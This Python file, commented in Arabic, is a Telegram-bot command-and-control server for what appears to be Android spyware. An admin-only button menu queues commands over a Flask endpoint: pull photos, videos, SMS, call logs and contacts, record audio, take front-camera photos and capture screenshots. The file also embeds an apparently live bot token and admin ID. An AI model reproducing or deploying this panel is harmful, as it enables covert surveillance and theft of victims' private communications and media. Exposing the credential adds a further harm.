import telebot
from flask import Flask
import threading
import time

# معلوماتك الصحيحة
TOKEN = "8788057411:AAFt0eEO19-QVKSchKaIky9raKY11QnVEyQ"
ADMIN_ID = 6829017835  # الأيدي الخاص بك لضمان الخصوصية

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# حذف الارتباطات القديمة
bot.remove_webhook()

current_command = "WAIT"

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # التحقق من أن المستخدم هو أنت فقط
    if message.from_user.id == ADMIN_ID:
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        btns = [
            telebot.types.InlineKeyboardButton("📸 سحب الصور", callback_data='GET_PHOTOS'),
            telebot.types.InlineKeyboardButton("🎥 سحب فيديوهات", callback_data='GET_VIDEOS'),
            telebot.types.InlineKeyboardButton("📞 سجل المكالمات", callback_data='GET_CALLS'),
            telebot.types.InlineKeyboardButton("💬 سحب SMS", callback_data='GET_SMS'),
            telebot.types.InlineKeyboardButton("👥 جهات الاتصال", callback_data='GET_CONTACTS'),
            telebot.types.InlineKeyboardButton("🎙️ تسجيل صوت", callback_data='RECORD_AUDIO'),
            telebot.types.InlineKeyboardButton("📸 كيمرا أمامية", callback_data='TAKE_FRONT_PHOTO'),
            telebot.types.InlineKeyboardButton("🖥️ لقطة شاشة", callback_data='SCREENSHOT')
        ]
        markup.add(*btns)
        bot.reply_to(message, "✅ أهلاً يا جنرال يوسف! السيطرة مفعلة لك وحدك:", reply_markup=markup)
    else:
        bot.reply_to(message, "⚠️ خطأ: غير مسموح لك بالدخول لهذه اللوحة.")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    global current_command
    if call.from_user.id == ADMIN_ID:
        current_command = call.data
        bot.answer_callback_query(call.id, f"تم إرسال أمر: {call.data}")
        bot.send_message(call.message.chat.id, f"📡 السيرفر ينتظر تنفيذ: [ {call.data} ]")

@app.route('/get_command')
def get_command():
    global current_command
    cmd = current_command
    current_command = "WAIT"
    return cmd

@app.route('/')
def home():
    return "Bot is Secure & Online"

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=10000)
